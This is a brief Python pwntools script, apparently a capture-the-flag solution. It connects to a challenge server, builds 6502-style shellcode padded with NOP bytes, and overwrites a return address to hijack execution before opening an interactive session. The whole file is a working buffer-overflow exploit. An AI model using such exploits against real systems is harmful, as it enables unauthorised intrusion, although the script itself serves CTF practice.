#!/usr/bin/env python
# coding=utf-8

from pwn import *
from pwn import logging

context.log_level = 'debug'

p = remote("chall0.o40.rev.fish", 1337)

p.recvuntil("What is your name?\n")

shell_code = """
A9 C9
8D 0000
A9 03
8D 0100
20 6F03
""".replace(" ", "").replace("\n", "").decode("hex")
print len(shell_code)

payload = shell_code.rjust(0x50, '\xEA') + p16(0x1ab)
p.sendline(payload)

p.interactive()

